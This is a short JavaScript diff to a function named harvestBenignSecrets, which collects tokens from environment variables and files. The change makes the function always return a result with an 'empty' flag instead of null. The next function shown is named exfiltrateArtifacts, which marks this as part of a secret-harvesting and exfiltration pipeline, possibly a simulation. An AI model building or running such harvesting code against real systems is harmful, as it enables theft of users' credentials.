@@ -223,14 +223,11 @@ function harvestBenignSecrets() {
   const envMatches = collectEnvironmentTokens();
   const fileMatches = collectFileTokens();
 
-  if (envMatches.length === 0 && fileMatches.length === 0) {
-    return null;
-  }
-
   return {
     envMatches,
     fileMatches,
     harvestedAt: new Date().toISOString(),
+    empty: envMatches.length === 0 && fileMatches.length === 0,
   };
 }
 function exfiltrateArtifacts(artifacts, source) {
